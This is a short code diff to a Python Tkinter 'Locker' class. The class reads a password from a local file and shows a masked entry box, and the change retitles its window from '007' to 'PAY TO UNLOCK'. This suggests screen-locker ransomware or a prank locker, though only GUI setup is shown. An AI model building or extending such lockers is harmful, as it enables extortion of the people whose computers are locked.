@@ -14,7 +14,7 @@ class Locker:
         self.block = False
         with open(r'pas.txt', 'r') as pas:
             self.data = pas.read()
-        root.title("007")
+        root.title("PAY TO UNLOCK")
         root.configure(background="#1c1c1c")
         self.entry = Entry(root, show='⮚', font='Arial 15', fg="red")
         self.entry.place(width=350, height=30, relx=0.4, rely=0.5, x=-30)
